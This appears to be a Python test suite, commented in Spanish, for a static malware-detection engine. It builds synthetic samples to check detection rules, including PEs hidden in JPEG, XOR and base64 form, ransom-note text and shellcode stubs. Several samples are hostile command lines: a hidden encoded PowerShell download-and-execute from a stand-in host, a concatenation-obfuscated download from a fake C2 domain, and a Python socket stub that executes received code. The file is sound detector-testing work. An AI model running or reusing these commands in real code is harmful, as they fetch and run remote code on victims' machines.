"""Ingeniería inversa estática: cargas ocultas, codificadas y cifradas."""
import base64
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core import static_re  # noqa: E402
from core.analyzer import analyze  # noqa: E402

TMP = Path(tempfile.mkdtemp(prefix="sentinel-re-"))
FAILS = []


def pe_bytes():
    """PE mínimo: cabecera MZ, e_lfanew y firma PE, con el stub DOS clásico."""
    mz = bytearray(0x200)
    mz[0:2] = b"MZ"
    mz[0x3C:0x40] = (0x80).to_bytes(4, "little")
    stub = b"This program cannot be run in DOS mode.\r\r\n$"
    mz[0x4E:0x4E + len(stub)] = stub
    mz[0x80:0x84] = b"PE\x00\x00"
    return bytes(mz)


JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + bytes(range(256)) * 8 + b"\xff\xd9"


def write(name, data):
    p = TMP / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return p


def rule_ids(result):
    return {f.get("rule_id") for f in result["findings"]}


def check(label, cond, got):
    print(f"{'OK ' if cond else 'FAIL'}  {label} -> {got}")
    if not cond:
        FAILS.append(label)


def main():
    r = static_re.analyze(write("foto.jpg", JPEG + pe_bytes() * 4), ("jpeg",))
    check("PE pegado tras un JPEG", "re_embedded_pe" in rule_ids(r), sorted(rule_ids(r)))
    check("overlay tras el JPEG", "re_overlay" in rule_ids(r), sorted(rule_ids(r)))
    check("veredicto PE en JPEG", analyze(TMP / "foto.jpg", online=False)["estado"] == "alerta",
          analyze(TMP / "foto.jpg", online=False)["estado"])

    xored = bytes(b ^ 0x5A for b in pe_bytes())
    r = static_re.analyze(write("datos.bin", b"\x00" * 300 + xored), ())
    check("PE cifrado con XOR", "re_xor_pe" in rule_ids(r), sorted(rule_ids(r)))

    b64 = base64.b64encode(pe_bytes() * 2).decode()
    r = static_re.analyze(write("loader.txt", f"payload = '{b64}'\n"), ())
    check("PE en base64", "re_encoded_pe" in rule_ids(r), sorted(rule_ids(r)))

    cmd = "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1'); Invoke-Expression $a"
    enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
    r = static_re.analyze(write("run.bat", f"powershell -nop -w hidden -EncodedCommand {enc}\n"), ())
    check("powershell -EncodedCommand", "re_encoded_script" in rule_ids(r), sorted(rule_ids(r)))

    code = "import os\nx = '" + base64.b64encode(
        b"import socket,subprocess;s=socket.socket();exec(s.recv(4096)) # " + b"a" * 120).decode() + "'\n"
    res = analyze(write("tool.py", code), online=False)
    check("script con código oculto en base64", "re_encoded_script" in rule_ids(res), res["estado"])

    note = b"All your files have been encrypted! Pay in bitcoin via Tor Browser to decrypt your files."
    r = static_re.analyze(write("leeme.bin", b"\x00" * 64 + note), ())
    check("nota de rescate", "re_ransom_strings" in rule_ids(r), sorted(rule_ids(r)))

    r = static_re.analyze(write("sc.bin", b"\x90" * 32 + b"\xfc\xe8\x82\x00\x00\x00" + b"\x60" * 64), ())
    check("stub de shellcode", "re_shellcode" in rule_ids(r), sorted(rule_ids(r)))

    # Evasión: palabras clave partidas por concatenación (PowerShell).
    ps = ("$a='Downl'+'oadStr'+'ing'; $b='Invoke-Expr'+'ession'\n"
          "$u='htt'+'p://c2.invalid/x.ps1'\n")
    r = static_re.analyze(write("split.ps1", ps), ())
    check("cadenas partidas en PowerShell", "re_deobfuscated" in rule_ids(r), sorted(rule_ids(r)))

    # Evasión: Chr() en VBScript en vez de texto (clásico en macros).
    vbs = "Dim s\ns = " + "&".join(f"Chr({ord(c)})" for c in "WScript.Shell") + "\n"
    r = static_re.analyze(write("macro.vbs", vbs), ())
    check("Chr() reconstruido en VBScript", "re_deobfuscated" in rule_ids(r), sorted(rule_ids(r)))

    # Código legítimo que concatena y menciona cmd.exe NO debe saltar.
    ok = "cmd = 'cmd.exe'\nparts = 'a' + 'b' + 'c'\nshell = True\n"
    r = static_re.analyze(write("normal.py", ok), ())
    check("concatenación normal no es evasión", "re_deobfuscated" not in rule_ids(r), sorted(rule_ids(r)))

    # Limpios: nada de lo anterior debe dispararse.
    r = static_re.analyze(write("limpia.jpg", JPEG), ("jpeg",))
    check("JPEG limpio", not r["findings"], r["findings"])
    img = base64.b64encode(bytes(range(256)) * 4).decode()
    r = static_re.analyze(write("pagina.html", f"<img src='data:image/png;base64,{img}'>"), ())
    check("imagen base64 en HTML no es carga", not r["findings"], sorted(rule_ids(r)))
    r = static_re.analyze(write("notas.txt", "Reunión: revisar presupuesto y calendario.\n" * 40), ())
    check("texto normal", not r["findings"], r["findings"])
    check("informa de los pasos", len(r["meta"]["pasos"]) >= 4, len(r["meta"]["pasos"]))

    if FAILS:
        print(f"\n{len(FAILS)} fallos: {FAILS}")
        sys.exit(1)
    print("\nTodos los casos de ingeniería inversa pasaron.")


if __name__ == "__main__":
    main()
